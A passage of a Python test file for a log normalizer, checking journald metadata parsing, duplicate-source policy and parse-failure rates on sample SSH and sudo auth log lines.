            '{"__REALTIME_TIMESTAMP":"1710000000123456","MESSAGE":"Accepted password for root from 1.2.3.4 port 22 ssh2",'
            '"_COMM":"sshd","_PID":"1234","_HOSTNAME":"node-1","_SYSTEMD_UNIT":"sshd.service","SYSLOG_IDENTIFIER":"sshd"}'
        )

        evt = normalizer.normalize(raw, "journald")

        assert evt.fields["metadata"]["journald"]["systemd_unit"] == "sshd.service"
        assert evt.fields["metadata"]["duplicate_candidate"]["source_class"] == "auth_log"
        assert evt.fields["metadata"]["duplicate_policy"]["source_rank"] == 2
        assert evt.fields["metadata"]["duplicate_policy"]["preferred_source_class"] == "auth_log"
        assert evt.fields["metadata"]["duplicate_policy"]["event_source_class"] == "auth_log"


# ── Source-Based Failure-Rate Logic ───────────────────────────────────

class TestParseFailStats:
    def test_fail_rate_calculation(self, normalizer):
        """The failure rate should be calculated correctly."""
        # 10 failed auditd lines
        for _ in range(10):
            normalizer.normalize("not auditd format at all xxx", "auditd")
        stats = normalizer.parse_fail_stats()
        src = stats.get("auditd", {})
        assert src.get("total", 0) >= 10
        # fail_rate should stay within 0-1
        assert 0.0 <= src.get("fail_rate", 0) <= 1.0

    def test_high_quality_source_low_fail(self, normalizer):
        """Valid syslog lines should keep the failure rate low."""
        lines = [
            "Mar  5 12:34:56 host sshd[1]: Accepted password for root from 1.2.3.4 port 22 ssh2",
            "Mar  5 12:35:00 host sudo[2]: alice : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/bin/ls",
            "Mar  5 12:36:00 host sshd[3]: Failed password for bob from 2.3.4.5 port 9999 ssh2",
        ]
        for line in lines:
            normalizer.normalize(line, "auth.log")
        stats = normalizer.parse_fail_stats()
        src = stats.get("auth.log", {})
        # Failure rate should stay low for valid lines
        assert src.get("fail_rate", 1.0) < 0.5
